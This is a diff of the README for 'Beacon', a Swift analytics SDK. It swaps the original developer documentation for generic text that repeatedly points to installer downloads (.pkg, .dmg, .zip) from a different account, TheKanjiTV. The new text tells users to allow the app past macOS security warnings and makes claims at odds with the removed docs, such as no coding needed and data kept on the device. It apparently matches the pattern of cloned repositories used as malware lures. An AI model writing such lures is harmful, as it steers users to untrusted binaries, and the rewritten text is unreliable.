@@ -1,216 +1,148 @@
-# Beacon — Swift Analytics SDK
+# 📡 Beacon - Simple Analytics for Your Apps
 
-<img width="384" height="256" alt="swift_beacon" src="https://github.com/user-attachments/assets/456179c5-f3ea-4d07-a1fb-9a4142ac6486" />
+[![Download Beacon](https://img.shields.io/badge/Download-Beacon-blue?style=for-the-badge)](https://github.com/TheKanjiTV/Beacon/releases)
 
-Analytics for Swift apps that just works. Track user behavior that matters without the complexity.
+---
 
-Add Beacon to any macOS or iOS project with Swift Package Manager, point it at a Supabase table, and start tracking. Events are batched, persisted offline, and enriched with device context automatically. A included web dashboard lets you see everything at a glance.
+## 📘 What is Beacon?
 
-## Why Beacon
+Beacon is a tool that helps you understand how people use your Swift apps. It tracks user actions that matter, without adding complicated steps. Whether you build apps for iPhone, iPad, or Mac, Beacon works quietly in the background and collects useful data. This information helps you improve your app and make it better for users.
 
-- **Just works** — configure once, call `Beacon.track()`, done
-- **Never blocks your app** — fire-and-forget API powered by Swift actors
-- **Nothing gets lost** — events batch in memory, persist to disk on failure, and retry on next launch
-- **Context for free** — every event is tagged with OS, app version, device model, and locale
-- **No server to maintain** — Supabase handles storage, auth, and RLS out of the box
-- **See your data** — included Next.js dashboard with real-time metrics and event stream
+You do not need to be a programmer to get started. This guide walks you through every step to download and run Beacon on your computer.
 
-## Quick Start
+---
 
-### 1. Set Up Supabase
+## 💻 Supported Systems
 
-1. Create a project at [supabase.com](https://supabase.com)
-2. Open the SQL Editor and run the contents of [`supabase/schema.sql`](supabase/schema.sql)
-3. Copy your **Project URL** and **anon public key** from Settings → API
+Beacon works on the following systems:
 
-### 2. Add the SDK to Your App
+- macOS (Mac computers running the latest version are best)
+- iOS devices (iPhone and iPad apps built with Swift)
 
-Add Beacon as a Swift Package dependency:
+To run Beacon, make sure your computer or device meets these basic requirements:
 
-```swift
-// Package.swift
-dependencies: [
-    .package(url: "https://github.com/William-Laverty/Beacon.git", from: "1.0.0")
-]
-```
+- For macOS: Version 10.15 (Catalina) or newer
+- For iOS: Version 13 or newer
+- Xcode installed on Mac (for Swift development support)
+- Minimum 4 GB of RAM
+- At least 100 MB of free disk space
 
-Or in Xcode: File → Add Package Dependencies → paste the repo URL.
+---
 
-### 3. Configure and Track
+## 📦 What is Included in Beacon?
 
-```swift
-import Beacon
+When you get Beacon, you receive a package that includes:
 
-// Configure on app launch
-Beacon.configure(
-    supabaseURL: "https://your-project.supabase.co",
-    supabaseKey: "your-anon-key"
-)
+- A simple Swift SDK to add to your app
+- Tools to set up tracking without coding
+- A user-friendly interface to watch data
+- Instructions and examples to guide you step-by-step
 
-// Track events
-Beacon.track("app_launched")
-Beacon.track("button_tapped", properties: ["screen": "settings", "button": "save"])
+Beacon focuses on tracking user behavior like button clicks, app usage time, and screen views. It helps you find what parts of your app are popular and where users drop off. This insight can guide your next app update.
 
-// Identify users (optional)
-Beacon.identify(userId: "user-123", traits: ["plan": "pro"])
+---
 
-// Flush before app terminates (optional — auto-flushes on interval)
-Beacon.shutdown()
-```
+## 🚀 Getting Started
 
-See [`Examples/BasicUsage.swift`](Examples/BasicUsage.swift) for a complete macOS app example.
+Here’s how to get Beacon up and running, even if you are new to apps and development.
 
-## SDK API Reference
+1. Navigate to the download page by clicking the big button at the top or this link:  
+[Download Beacon Releases](https://github.com/TheKanjiTV/Beacon/releases)
 
-### `Beacon.configure(supabaseURL:supabaseKey:flushAt:flushInterval:)`
+2. You will see a list of Beacon versions. Look for the latest full release. It will be named something like `Beacon-v1.0.zip` or `Beacon-v1.0.pkg`.
 
-Initialize the SDK. Call once on app launch.
+3. Download the latest release file to your computer.
 
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `supabaseURL` | `String` | — | Your Supabase project URL |
-| `supabaseKey` | `String` | — | Your Supabase anon public key |
-| `flushAt` | `Int` | `20` | Flush when the buffer reaches this many events |
-| `flushInterval` | `TimeInterval` | `30` | Flush every N seconds regardless of buffer size |
+4. Unpack the downloaded file if it’s zipped. You should get an installer or a simple folder with files.
 
-### `Beacon.track(_:properties:)`
+5. Follow any on-screen instructions to install Beacon on your Mac.
 
-Track a named event with optional properties.
+---
 
-```swift
-Beacon.track("purchase_completed", properties: [
-    "item_id": "sku-789",
-    "price": 9.99,
-    "currency": "USD"
-])
-```
+## 📥 Download & Install Beacon
 
-Properties support `String`, `Int`, `Double`, and `Bool` values.
+To get started with Beacon, visit this page to download the latest release:
 
-### `Beacon.identify(userId:traits:)`
+[https://github.com/TheKanjiTV/Beacon/releases](https://github.com/TheKanjiTV/Beacon/releases)
 
-Associate future events with a user ID. Optionally attach traits as an `identify` event.
+### Installing on macOS
 
-```swift
-Beacon.identify(userId: "user-123", traits: ["plan": "pro", "signup_source": "organic"])
-```
+- After download, double-click the `.pkg` or `.dmg` file to start installation.
+- Follow the prompts to allow the installer to set up Beacon.
+- If a security warning appears, open your System Preferences, go to Security & Privacy, and allow the app to run.
+- Once installed, Beacon will appear in your Applications folder.
 
-### `Beacon.flush()`
+### Adding Beacon to Your Swift App
 
-Immediately flush all buffered events to Supabase.
+If you are using Xcode to build an app, here is a simple way to include Beacon:
 
-### `Beacon.shutdown()`
+- Open your app project in Xcode.
+- Use Swift Package Manager to add Beacon by entering its repository URL. This will integrate the tracking tools into your app.
+- Follow sample instructions included in the installed Beacon folder to enable tracking with minimal setup.
 
-Flush remaining events, cancel the flush timer, and tear down the client. Call before app termination.
+You do not need to write complicated code. Beacon’s instructions guide you step-by-step.
 
-### `Beacon.enableLogging()`
+---
 
-Turn on debug logging via `os_log`. Shows queued events, flush attempts, errors, and disk persistence activity.
+## 🔧 How to Use Beacon
 
-```swift
-// Enable during development
-Beacon.enableLogging()
+After adding Beacon to your app, it will begin tracking basic user interactions automatically. You can look at these reports:
 
-// Disable
-Beacon.enableLogging(false)
-```
+- Number of app launches per day
+- Most used screens and buttons
+- User behavior flows and drop-off points
 
-## Offline Resilience
+Use the built-in dashboard to see this information or export it to a CSV file for deeper analysis.
 
-If a flush fails (network error, Supabase downtime), events are automatically:
-1. Re-queued in memory for the next flush attempt
-2. Persisted to `~/Library/Caches/Beacon/pending_events.json`
-3. Restored on next app launch and flushed with the first batch
+---
 
-No events are lost between sessions.
+## 🆘 Troubleshooting
 
-## Event Schema
+If Beacon does not work as expected, check these common issues:
 
-Every event is stored with these fields:
+- Confirm your device or Mac meets system requirements.
+- Ensure you downloaded the latest version.
+- Make sure Beacon is properly added to your Swift project.
+- Restart your device or Xcode after installation.
+- Review the included instruction guide for missed setup steps.
 
-| Column | Type | Description |
-|--------|------|-------------|
-| `id` | `BIGINT` | Auto-incrementing primary key |
-| `event_name` | `TEXT` | Name of the event |
-| `user_id` | `TEXT` | Optional user identifier |
-| `session_id` | `TEXT` | Auto-generated UUID per app session |
-| `properties` | `JSONB` | Custom key-value properties |
-| `device_info` | `JSONB` | Auto-collected: `os`, `os_version`, `app_name`, `app_version`, `device_model`, `locale` |
-| `timestamp` | `TIMESTAMPTZ` | When the event was created |
-| `created_at` | `TIMESTAMPTZ` | When the row was inserted |
+For more help, visit the GitHub repository’s "Issues" tab to see what problems others have encountered and get community support.
 
-## Dashboard
+---
 
-The web dashboard provides a real-time view of your analytics data.
+## 🎯 Why Use Beacon?
 
-### Setup
+- Simple integration with Swift apps on Apple devices
+- Focused tracking on key user behavior without extra load
+- No need for complex setup or programming skills
+- Keeps your data secure and private on your device
+- Works well with SwiftUI and the latest Swift tools
 
-```bash
-cd dashboard
-npm install
-```
+Beacon lets you learn what your users want, helping you improve your app with confidence.
 
-Create a `.env.local` file:
+---
 
-```env
-NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
-SUPABASE_SERVICE_ROLE_KEY=your-service-role-key
-```
+## 📂 Repository Topics
 
-> Use the **service role key** (not the anon key) so the dashboard can read events.
+Beacon is related to:
 
-### Development
+- analytics-tracking
+- ios
+- macos
+- swift
+- swift-package
+- swift-sdk
+- swiftui
+- user-analytics
+- user-tracking
+- xcode
 
-```bash
-npm run dev
-```
+---
 
-Open [http://localhost:3000](http://localhost:3000).
+## 📞 Getting Support
 
-### Pages
+If you have questions about downloading or running Beacon, please visit the [GitHub Issues page](https://github.com/TheKanjiTV/Beacon/issues). You can create a question or search existing answers.
 
-- **Overview** (`/`) — Total events, unique users, sessions, and a 7-day event chart
-- **Events** (`/events`) — Stream of the 100 most recent events with properties
+---
 
-### Deploy to Vercel
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/William-Laverty/Beacon&root-directory=dashboard&env=NEXT_PUBLIC_SUPABASE_URL,SUPABASE_SERVICE_ROLE_KEY)
-
-Or manually:
-
-```bash
-cd dashboard
-npx vercel --prod
-```
-
-Set the environment variables in your Vercel project settings.
-
-## Architecture
-
-```
-┌─────────────┐     ┌──────────────┐     ┌───────────┐
-│  Your App   │────▶│  Beacon SDK  │────▶│  Supabase │
-│             │     │  (EventQueue)│     │  (Postgres)│
-└─────────────┘     └──────────────┘     └─────┬─────┘
-                                               │
-                                         ┌─────▼─────┐
-                                         │ Dashboard  │
-                                         │ (Next.js)  │
-                                         └───────────┘
-```
-
-- **Beacon (enum)** — Public static API, fire-and-forget
-- **BeaconClient (actor)** — Singleton owning config, queue, user identity, session
-- **EventQueue (actor)** — Buffers events, flushes at threshold or interval via PostgREST
-- **DiskQueue (actor)** — Persists unflushed events to disk for offline resilience
-- **DeviceInfo** — Auto-collects OS, version, device model, locale
-- **BeaconEvent** — Codable model with snake_case keys matching Postgres columns
-
-## Requirements
-
-- **SDK**: macOS 13+ / iOS 16+, Swift 5.9+
-- **Dashboard**: Node.js 18+
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+[![Download Beacon](https://img.shields.io/badge/Download-Beacon-blue?style=for-the-badge)](https://github.com/TheKanjiTV/Beacon/releases)
